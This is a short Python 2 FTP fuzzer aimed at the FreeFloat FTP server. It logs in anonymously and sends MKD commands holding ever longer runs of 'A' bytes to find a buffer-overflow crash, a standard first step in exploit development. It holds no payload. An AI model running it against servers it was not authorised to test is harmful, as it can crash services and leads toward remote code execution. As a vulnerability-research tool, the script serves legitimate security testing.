#!/usr/bin/env python
import socket
import sys

if len(sys.argv) < 2:
  print "[*] FreeFlot FTP fuzzer"
  print "[*] Usage: "+sys.argv[0]+" <ip addr>"
  sys.exit()

buffer = ["\x41"]
counter = 100
while len(buffer) <= 30:
  buffer.append("\x41" * counter)
  counter = counter + 200

for string in buffer:
  print "[*] Fuzzing MKD command %s bytes" % len(string)
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  connect = s.connect((str(sys.argv[1]), 21))

  s.recv(1024)
  s.send('USER anonymous\r\n')
  s.recv(1024)
  s.send('PASS anonymous\r\n')
  s.recv(1024)
  s.send('MKD ' + string +'\r\n')
  s.recv(1024)
  s.send('QUIT\r\n')
  s.close()
